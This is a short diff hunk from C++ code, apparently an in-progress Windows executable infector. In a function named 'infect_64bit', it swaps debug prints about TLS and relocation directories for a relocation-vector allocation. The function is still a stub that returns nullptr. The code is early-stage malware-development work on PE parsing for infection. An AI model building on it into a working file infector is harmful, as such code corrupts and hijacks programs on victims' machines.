@@ -278,24 +278,13 @@ PIMAGE_DOS_HEADER infect_64bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, std::
 {
    std::uint8_t *byte_module = reinterpret_cast<std::uint8_t *>(module);
    PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(byte_module+module->e_lfanew);
-
-   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
-   {
-      std::wcout << "\t\tExecutable does not have a TLS directory." << std::endl;
-   }
-   else
-   {
-      std::wcout << "\t\tExecutable has a TLS directory." << std::endl;
-   }
-
-   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
-      std::wcout << "\t\tExecutable has no relocations." << std::endl;
-   else
-      std::wcout << "\t\tExecutable has relocations." << std::endl;
-
    std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
    IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(byte_module+module->e_lfanew+nt_headers_size);
+   CVector relocations = cvector_alloc(iat, 0, 0);
 
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
+      relocations = cvector_alloc(iat, sizeof(std::uint32_t), 0);
+         
    return nullptr;
 }
 
